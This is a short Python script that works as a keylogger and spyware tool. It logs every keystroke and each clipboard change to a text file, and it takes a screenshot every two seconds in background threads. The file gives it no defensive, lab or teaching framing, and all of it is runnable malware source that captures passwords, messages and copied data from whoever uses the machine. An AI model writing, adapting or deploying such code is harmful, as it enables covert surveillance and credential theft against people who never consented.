# pip install pyautogui pillow
import pyautogui
from datetime import datetime
import os
# pip install pynput
from pynput.keyboard import Listener
import time
# pip install pyperclip
import pyperclip
# threading
import threading

# screenshot
def screenshot():
    # Create the 'screenshots' if it doesn't exist
    if not os.path.exists('screenshots'):
        os.makedirs('screenshots')
        
    # Generate a timestamped filename
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join('screenshots', f"screenshot_{timestamp}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)



def wait(duration):
    start_time = time.time()
    
    while True:
        elapsed_time = time.time() - start_time
        if elapsed_time >= duration:
            break

def clipboard():
    previous = ""

    while True:
        current = pyperclip.paste()
        
        if current != previous:
            previous = current
            with open('log.txt', 'a') as f:
                f.write('\n ---------------------------------------Clipboard Changed------------------------------------------- \n')
                f.write(current)
                f.write('\n --------------------------------------------------------------------------------------------------- \n')
        time.sleep(1)


def write(key):

    letter = str(key).replace("'","")

    # making log cleaner
    if ".space" in letter:
        letter = ' '
    elif 'enter' in letter:
        letter = '\n'
    elif 'shift' in letter or 'ctrl' in letter or 'tab' in letter or 'alt' in letter:
        letter = ''
    elif 'up' in letter or 'down' in letter or  'left' in letter or 'right' in letter:
        letter= ''
    elif 'backspace' in letter:
        letter = '(Backspace)'
    
    # Finaly writing in the file
    with open('log.txt','a') as f:
        f.write(letter)

def scloop():
    while True:
        screenshot()
        wait(2) 

# Start the screenshot loop in a separate thread
scthread = threading.Thread(target=scloop)
scthread.daemon = True
scthread.start()

'''
Deamon threads are those threads which
will automatically terminate when the
main program ends. It does not require 
join() command to end.
'''
# Starting clipboard loop in a separate thread
clip_thread = threading.Thread(target=clipboard)
clip_thread.daemon = True
clip_thread.start()


with Listener(on_press = write) as l:
    l.join()

